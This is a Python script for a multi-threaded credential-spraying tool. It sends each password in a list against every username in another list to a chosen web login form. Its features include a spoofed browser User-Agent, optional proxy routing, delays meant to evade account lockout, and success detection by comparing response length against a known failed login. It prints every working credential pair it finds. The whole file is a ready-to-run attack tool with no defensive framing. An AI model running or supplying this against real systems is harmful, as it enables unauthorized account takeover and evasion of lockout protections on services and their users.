import requests
import sys
import argparse
import time
from concurrent.futures import ThreadPoolExecutor

parser = argparse.ArgumentParser(description="Multi-threaded Credential Sprayer")
parser.add_argument("-t", "--target", required=True, help="Target URL")
parser.add_argument("-u", "--users", required=True, help="Path to username file")
parser.add_argument("-p", "--passwords", required=True, help="Path to password file")
parser.add_argument("-uf", "--user_field", default="username", help="HTML field name for user (default: username)")
parser.add_argument("-pf", "--pass_field", default="password", help="HTML field name for password (default: password)")
parser.add_argument("-th", "--threads", type=int, default=10, help="Number of threads")
parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
parser.add_argument("-s", "--sleep", type=float, default=0, help="sleep time to avoid lockout")
args = parser.parse_args()

proxies = None
if args.proxy:
    proxies = {
        "http": args.proxy,
        "https": args.proxy
    }
    print(f"[*] Proxy enabled: {args.proxy}")

def attempt_login(username, password, url, failure_size, u_field, p_field):
    try:
        data = {u_field: username, p_field: password}
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        r = requests.post(url, data=data, headers=headers, proxies=proxies, timeout=5)
        if abs(len(r.content) - failure_size) > 20:
            sys.stdout.write(f"\n[+] SUCCESS: {username}:{password} \n")
            return True
    except:
        pass
    return False

try:
    with open(args.users, "r", encoding="latin-1") as f:
        users = f.read().splitlines()
    with open(args.passwords, "r", encoding="latin-1") as f:
        passwords = f.read().splitlines()
except FileNotFoundError:
    print(f"\n[!] Error: The files were not found.")
    sys.exit()

print("[*] establishing baseline...")
try:
    wrong_login = requests.post(args.target, data={args.user_field: 'invalid_admin', args.pass_field: 'invalid_admin'}, proxies=proxies, timeout=10)
    failure_size = len(wrong_login.content)
except Exception as e:
    print("[!] Connection failed. Check the URL.")
    sys.exit()

for password in passwords:
    sys.stdout.write(f"\r[*] Spraying password: {password:<30}")
    sys.stdout.flush()
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = []
            for user in users:
                futures.append(executor.submit(attempt_login, user, password, args.target, failure_size, args.user_field, args.pass_field))
    time.sleep(args.sleep)

print("[*] Scan complete.")       